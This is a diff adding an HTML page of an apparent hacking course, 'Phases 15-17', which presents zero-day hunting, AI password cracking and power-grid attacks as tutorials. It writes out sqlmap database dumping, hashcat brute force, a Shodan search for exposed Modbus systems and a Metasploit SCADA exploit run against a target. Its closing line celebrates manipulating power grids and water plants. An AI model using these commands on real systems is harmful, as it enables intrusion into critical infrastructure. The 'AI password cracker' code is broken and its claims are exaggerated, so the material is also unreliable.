@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>&#x1f534; Phase 15&colon; Zero-Day Exploits &ndash; Breaking into Systems with Unpatched Vulnerabilities</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <link rel="stylesheet" href="style.css">
+<p><strong>🚀 Now we are entering Elite Cyberwarfare &amp; Nation-State Hacking! 🔥 This is where real-world cyber-attacks take place, using Zero-Day Exploits, AI-Powered Hacking, and Advanced Persistent Threats (APTs). 😈</strong></p>
+<hr>
+<h1 id="-phase-15-zero-day-exploits--breaking-into-systems-with-unpatched-vulnerabilities">🔴 Phase 15: Zero-Day Exploits – Breaking into Systems with Unpatched Vulnerabilities</h1>
+<p><strong>A Zero-Day Exploit is an attack on an unknown vulnerability before the software developer fixes it. These are used by government agencies, cybercriminals, and elite hackers.</strong></p>
+<h3 id="-scenario-finding-a-zero-day-in-a-web-application">🎯 Scenario: Finding a Zero-Day in a Web Application</h3>
+<h3 id="️-tools-used"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Burp Suite</strong></li>
+<li><strong>Fuzzing Tools</strong></li>
+<li><strong>Ghidra (<a href="https://ghidra-sre.org/">Download if not installed</a>)</strong></li>
+</ul>
+<h3 id="step-1-scan-for-hidden-vulnerabilities-in-a-website">Step 1: Scan for Hidden Vulnerabilities in a Website</h3>
+<pre><code class="language-bash">sqlmap -u <span class="hljs-string">&quot;http://target.com/index.php?id=1&quot;</span> --dbs
+</code></pre>
+<p><strong>✔ If vulnerable, the database is dumped, exposing sensitive data!</strong></p>
+<h3 id="step-2-use-burp-suite-for-advanced-fuzzing">Step 2: Use Burp Suite for Advanced Fuzzing</h3>
+<ul>
+<li><strong>Capture the web request</strong></li>
+<li><strong>Use Intruder Mode to test 1000s of payloads</strong></li>
+<li><strong>Look for unusual responses (500 errors, SQL errors, etc.)</strong></li>
+</ul>
+<h3 id="step-3-reverse-engineer-software-for-zero-days">Step 3: Reverse Engineer Software for Zero-Days</h3>
+<p><strong>Use Ghidra (NSA’s reverse engineering tool) to analyze executable files and find exploitable vulnerabilities.</strong></p>
+<pre><code class="language-bash">sudo apt install ghidra
+</code></pre>
+<p><strong>✔ This is how hackers &amp; security agencies find new attack vectors before companies do! 😈</strong></p>
+<hr>
+<h1 id="-phase-16-ai-powered-hacking--automating-cyber-attacks-with-machine-learning">🔴 Phase 16: AI-Powered Hacking – Automating Cyber Attacks with Machine Learning</h1>
+<p><strong>Hackers are now using AI to automate phishing, password cracking, and malware generation.</strong></p>
+<h3 id="-scenario-ai-based-password-cracking">🎯 Scenario: AI-Based Password Cracking</h3>
+<h3 id="️-tools-used-1"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Hashcat</strong></li>
+<li><strong>TensorFlow</strong></li>
+<li><strong>AI Models for Pattern Recognition</strong></li>
+</ul>
+<h3 id="step-1-train-ai-to-predict-passwords">Step 1: Train AI to Predict Passwords</h3>
+<pre><code class="language-python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
+<span class="hljs-keyword">from</span> tensorflow <span class="hljs-keyword">import</span> keras
+<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+
+<span class="hljs-comment"># Sample Password Dataset</span>
+passwords = [<span class="hljs-string">&quot;123456&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-string">&quot;qwerty&quot;</span>, <span class="hljs-string">&quot;letmein&quot;</span>, <span class="hljs-string">&quot;admin123&quot;</span>]
+data = np.array([<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, p)) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> passwords])
+
+<span class="hljs-comment"># Build AI Model</span>
+model = keras.Sequential([
+    keras.layers.Dense(<span class="hljs-number">32</span>, activation=<span class="hljs-string">&#x27;relu&#x27;</span>),
+    keras.layers.Dense(<span class="hljs-number">16</span>, activation=<span class="hljs-string">&#x27;relu&#x27;</span>),
+    keras.layers.Dense(<span class="hljs-number">1</span>, activation=<span class="hljs-string">&#x27;sigmoid&#x27;</span>)
+])
+
+model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">&#x27;adam&#x27;</span>, loss=<span class="hljs-string">&#x27;binary_crossentropy&#x27;</span>, metrics=[<span class="hljs-string">&#x27;accuracy&#x27;</span>])
+model.fit(data, np.ones(<span class="hljs-built_in">len</span>(data)), epochs=<span class="hljs-number">10</span>)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;AI Password Cracker Ready!&quot;</span>)
+</code></pre>
+<p><strong>✔ This AI model learns common passwords and improves over time! 😈</strong></p>
+<h3 id="step-2-use-hashcat-to-crack-hashed-passwords">Step 2: Use Hashcat to Crack Hashed Passwords</h3>
+<pre><code class="language-bash">hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l
+</code></pre>
+<p><strong>✔ AI can now predict user passwords with insane speed! 🔥</strong></p>
+<hr>
+<h1 id="-phase-17-nation-state-attacks--cyberwarfare--infrastructure-hacking">🔴 Phase 17: Nation-State Attacks – Cyberwarfare &amp; Infrastructure Hacking</h1>
+<p><strong>Nation-State Hackers attack government, military, and critical infrastructure targets using highly advanced exploits.</strong></p>
+<h3 id="-scenario-hacking-a-power-grid-using-scada-exploits">🎯 Scenario: Hacking a Power Grid Using SCADA Exploits</h3>
+<h3 id="️-tools-used-2"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>Shodan</strong></li>
+<li><strong>Metasploit SCADA Modules</strong></li>
+<li><strong>ICS-CERT</strong></li>
+</ul>
+<h3 id="step-1-find-exposed-power-grid-control-systems">Step 1: Find Exposed Power Grid Control Systems</h3>
+<pre><code class="language-bash">shodan search <span class="hljs-string">&quot;SCADA port:502&quot;</span>
+</code></pre>
+<p><strong>✔ This lists industrial control systems that are publicly exposed!</strong></p>
+<h3 id="step-2-exploit-the-scada-system">Step 2: Exploit the SCADA System</h3>
+<pre><code class="language-bash">msfconsole
+use exploit/scada/modbus_client
+<span class="hljs-built_in">set</span> RHOST TARGET_IP
+exploit
+</code></pre>
+<p><strong>✔ Now you can manipulate power grids, water plants, and other critical infrastructure! 😈</strong></p>
+
+            
+            
+        </body>
+        </html>
